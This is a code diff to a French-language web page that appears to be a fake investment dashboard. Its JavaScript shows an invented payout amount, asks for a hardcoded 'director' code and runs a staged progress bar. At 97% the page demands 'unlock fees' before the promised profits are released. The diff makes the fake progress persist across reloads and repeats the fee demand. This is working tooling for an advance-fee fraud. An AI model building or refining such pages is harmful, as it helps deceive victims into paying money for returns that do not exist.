@@ -113,7 +113,6 @@
     </style>
 </head>
 <body>
-   
     <div id="investor-info" class="interface"></div>
     <div class="background-image"></div>
     <div class="interface">   
@@ -148,6 +147,27 @@
             <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
         `;
 
+        let percent = parseInt(localStorage.getItem('progress')) || 0;
+        const progressBar = document.querySelector('.progress');
+        const progressPercent = document.querySelector('.progress-percent');
+        let interval;
+
+        function progress() {
+            if (percent < 100) {
+                progressBar.style.width = percent + '%';
+                progressPercent.textContent = percent + '%';
+                percent++;
+                localStorage.setItem('progress', percent);
+            } else {
+                clearInterval(interval);
+            }
+
+            if (percent == 97) {
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de deblocage afin de valider votre transaction et recevoir immediatement vos benefices dans les 15 minutes.';
+                alert('Veillez payer les frais demander');
+            }
+        }
+
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
             if (code2 == "2120") {
@@ -155,38 +175,21 @@
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
                 document.querySelector('#btn-receive').style.display = 'inline-block';
-                
-                // Empêcher l'actualisation de la page
-                window.addEventListener('beforeunload', (event) => {
-                    event.preventDefault();
-                    event.returnValue = '';
-                });
             } else {
                 alert("Code incorrect");
             }
         });
 
         document.querySelector('#btn-receive').addEventListener('click', () => {
-            // Afficher la boîte de dialogue
-            alert('Veuillez payer les frais demandés');
+            alert('Veillez payer les frais demander');
         });
 
-        const progressBar = document.querySelector('.progress');
-        const progressPercent = document.querySelector('.progress-percent');
-        let percent = 0;
-        let interval;
-
-        function progress() {
-            if (percent <= 99) {
-                progressBar.style.width = percent + '%';
-                progressPercent.textContent = percent + '%';
-                percent++;
-            } else {
-                clearInterval(interval);
-            }
-
-            if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de deblocage afin de valider votre transaction et recevoir immediatement vos benefices dans les 15 minutes.';
+        // Restore progress on page load
+        if (percent > 0) {
+            progressBar.style.width = percent + '%';
+            progressPercent.textContent = percent + '%';
+            if (percent < 100) {
+                interval = setInterval(progress, 15500);
             }
         }
     </script>
